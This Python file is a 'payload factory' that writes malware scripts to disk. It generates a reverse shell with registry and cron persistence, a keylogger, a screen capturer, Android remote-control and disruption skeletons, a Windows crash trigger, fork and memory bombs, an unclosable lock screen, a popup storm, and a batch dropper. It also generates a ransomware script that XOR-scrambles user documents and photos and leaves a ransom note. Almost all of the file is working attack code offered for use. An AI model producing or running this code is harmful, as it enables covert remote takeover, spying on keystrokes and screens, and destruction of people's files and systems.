#!/usr/bin/env python3
"""CONTROL vs DESTROY payload factory — dangerous edition"""

from pathlib import Path
import textwrap
import time

class PayloadFactory:
    def __init__(self, out_dir: Path):
        self.out_dir = Path(out_dir)
        self.control_dir = self.out_dir / "control"
        self.destroy_dir = self.out_dir / "destroy"
        self.control_dir.mkdir(parents=True, exist_ok=True)
        self.destroy_dir.mkdir(parents=True, exist_ok=True)

    # ───────── CONTROL ─────────

    def control_reverse_shell(self, host="127.0.0.1", port=4444, name="control_revshell.py"):
        code = textwrap.dedent(f'''\
        import socket, subprocess, os, sys, time, threading, platform
        HOST, PORT = "{host}", {port}
        def persist():
            try:
                if platform.system() == "Windows":
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WinUpdateSvc", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                    winreg.CloseKey(key)
                else:
                    cron = f"@reboot python3 {{os.path.abspath(__file__)}}\\n"
                    os.system(f'(crontab -l 2>/dev/null; echo "{{cron}}") | crontab -')
            except Exception:
                pass
        def shell():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    s.send(f"[CONTROL] {{platform.node()}} {{platform.system()}} online\\n".encode())
                    while True:
                        cmd = s.recv(8192).decode(errors="ignore").strip()
                        if not cmd: break
                        if cmd.lower() in ("exit","quit"): break
                        if cmd.startswith("cd "):
                            try: os.chdir(cmd[3:].strip()); s.send(b"ok\\n")
                            except Exception as e: s.send(str(e).encode()+b"\\n")
                            continue
                        if cmd == "persist":
                            persist(); s.send(b"persistence installed\\n"); continue
                        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out = p.stdout.read() + p.stderr.read()
                        s.send(out or b"\\n")
                    s.close()
                except Exception:
                    time.sleep(8)
        if __name__ == "__main__":
            threading.Thread(target=persist, daemon=True).start()
            shell()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_keylogger(self, name="control_keylog.py"):
        code = textwrap.dedent('''\
        # pip install pynput
        from pynput import keyboard
        import time, os, platform
        LOG = os.path.join(os.getenv("TEMP") or "/tmp", "syscache.dat")
        def on_press(key):
            try: k = key.char
            except: k = f"[{{key}}]"
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(f"{time.time()}:{k}")
        with keyboard.Listener(on_press=on_press) as L:
            L.join()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_screen(self, name="control_screen.py"):
        code = textwrap.dedent('''\
        # pip install pillow mss
        import time, os
        from mss import mss
        from PIL import Image
        OUT = os.path.join(os.getenv("TEMP") or "/tmp", "shots")
        os.makedirs(OUT, exist_ok=True)
        with mss() as sct:
            while True:
                shot = sct.shot(output=os.path.join(OUT, f"{int(time.time())}.png"))
                time.sleep(4)
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_android_skeleton(self, name="control_android.py"):
        code = textwrap.dedent('''\
        # Android control skeleton — package with Buildozer / Chaquopy
        # Requires: INTERNET, READ_SMS, CAMERA, RECORD_AUDIO, WRITE_EXTERNAL_STORAGE
        import socket, time, os, threading
        HOST, PORT = "YOUR_IP", 4444
        def android_shell():
            while True:
                try:
                    s = socket.socket()
                    s.connect((HOST, PORT))
                    s.send(b"[ANDROID CONTROL] online\\n")
                    while True:
                        cmd = s.recv(4096).decode(errors="ignore").strip()
                        if cmd == "sms":
                            # placeholder — use android API via pyjnius / kivy
                            s.send(b"sms dump not bound yet\\n")
                        elif cmd == "cam":
                            s.send(b"camera capture not bound yet\\n")
                        elif cmd.startswith("sh "):
                            out = os.popen(cmd[3:]).read()
                            s.send(out.encode() or b"\\n")
                        else:
                            s.send(b"unknown\\n")
                except Exception:
                    time.sleep(10)
        if __name__ == "__main__":
            android_shell()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    # ───────── DESTROY ─────────

    def destroy_crash(self, name="destroy_crash.py"):
        code = textwrap.dedent('''\
        import os, sys, ctypes, time, random, platform
        def win_bsod():
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except Exception:
                pass
        def fork_bomb():
            while True:
                try: os.fork()
                except: pass
        def mem_bomb():
            a = []
            while True:
                a.append(bytearray(50_000_000))
        def cpu_melt():
            while True:
                x = 0
                for i in range(10**8): x += i*i
        if platform.system() == "Windows":
            win_bsod()
            mem_bomb()
        else:
            try: fork_bomb()
            except: mem_bomb()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_lock(self, name="destroy_lock.py"):
        code = textwrap.dedent('''\
        import sys, time, random
        try:
            import tkinter as tk
        except: sys.exit(0)
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.configure(bg="#000000")
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        label = tk.Label(root, text="SYSTEM LOCKED\\nNetWatch Dominator", fg="#ff2222", bg="#000",
                         font=("Consolas", 32))
        label.pack(expand=True)
        def flash():
            label.configure(fg=random.choice(["#ff0000", "#ff2222", "#aa0000"]))
            root.after(200, flash)
        flash()
        # block alt-f4 etc as much as possible
        root.bind("<Alt-F4>", lambda e: "break")
        root.bind("<Escape>", lambda e: "break")
        root.mainloop()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_ransomware_sim(self, name="destroy_ransom.py"):
        code = textwrap.dedent('''\
        import os, sys, time, base64
        from pathlib import Path
        NOTE = """
        YOUR FILES HAVE BEEN ENCRYPTED BY NETWATCH DOMINATOR
        Contact the operator. This is a simulation payload — real crypto omitted.
        """
        targets = []
        home = Path.home()
        for folder in ["Desktop", "Documents", "Downloads", "Pictures"]:
            p = home / folder
            if p.exists():
                for f in p.rglob("*"):
                    if f.is_file() and f.suffix.lower() in {".txt",".docx",".pdf",".jpg",".png",".xlsx"}:
                        targets.append(f)
        for f in targets[:80]:  # limit
            try:
                data = f.read_bytes()
                # simple xor "encrypt" for demo — not real crypto
                key = 0x5A
                enc = bytes(b ^ key for b in data)
                f.write_bytes(enc)
                f.rename(str(f) + ".locked")
            except Exception:
                pass
        note_path = home / "Desktop" / "READ_ME_NOW.txt"
        try:
            note_path.write_text(NOTE, encoding="utf-8")
        except Exception:
            pass
        print("simulation complete")
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_popup_storm(self, name="destroy_popups.py", n=80):
        code = textwrap.dedent(f'''\
        import random, time, sys
        try:
            import tkinter as tk
            from tkinter import messagebox
        except: sys.exit(0)
        msgs = ["CRITICAL ERROR","FILES CORRUPTED","KERNEL PANIC","UPDATE FAILED",
                "SECURITY BREACH","SYSTEM COMPROMISED","DO NOT REBOOT","NETWATCH"]
        root = tk.Tk(); root.withdraw()
        for _ in range({n}):
            try:
                messagebox.showerror(random.choice(msgs), random.choice(msgs))
                time.sleep(random.uniform(0.15, 0.6))
            except: break
        root.destroy()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_android_skeleton(self, name="destroy_android.py"):
        code = textwrap.dedent('''\
        # Android destroy skeleton — package to apk via Buildozer
        # Effects: screen lock spam, vibration loop, volume max, airplane toggle attempts
        import time, os
        def melt():
            while True:
                try:
                    # placeholders for android APIs via pyjnius
                    os.system("input keyevent 26")  # power
                    time.sleep(0.3)
                except: time.sleep(1)
        if __name__ == "__main__":
            melt()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def dropper(self, target_py: Path, name=None):
        if name is None:
            name = target_py.stem + "_dropper.bat"
        code = f'''@echo off
cd /d "%~dp0"
python "{target_py.name}" 2>nul || py "{target_py.name}" 2>nul || python3 "{target_py.name}"
'''
        p = target_py.parent / name
        p.write_text(code, encoding="utf-8")
        return p

    def list_all(self):
        return list(self.control_dir.glob("*")) + list(self.destroy_dir.glob("*"))
